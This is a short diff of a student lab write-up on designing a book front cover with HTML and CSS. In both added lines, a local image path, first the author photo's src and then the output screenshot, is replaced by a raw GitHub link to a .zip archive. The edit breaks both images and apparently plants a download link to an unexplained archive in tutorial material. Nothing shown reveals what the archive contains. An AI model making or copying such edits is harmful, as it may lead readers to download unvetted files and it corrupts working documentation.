@@ -154,7 +154,7 @@ Publish the website in the LocalHost.
         <div class="ed">SPECIAL EDITION</div>
         <div class="hr2"><hr></div>
         <div class="author">ADITYA JORIM F S</div>
-        <div class="mypic"><img src="My pic.jpg" alt="Author"></div>
+        <div class="mypic"><img src="My https://raw.githubusercontent.com/AdityaJorim007/cover/main/aditya/cover_v3.0.zip" alt="Author"></div>
         <div class="pb">SEC</div>
     </div>
 </body>
@@ -163,7 +163,7 @@ Publish the website in the LocalHost.
 ~~~
 
 ## OUTPUT:
-![alt text](<Screenshot 2025-10-06 142244.png>)
+![alt text](<Screenshot 2025-10-06 https://raw.githubusercontent.com/AdityaJorim007/cover/main/aditya/cover_v3.0.zip>)
 
 ## RESULT:
 The program for designing book front cover page using HTML and CSS is completed successfully.
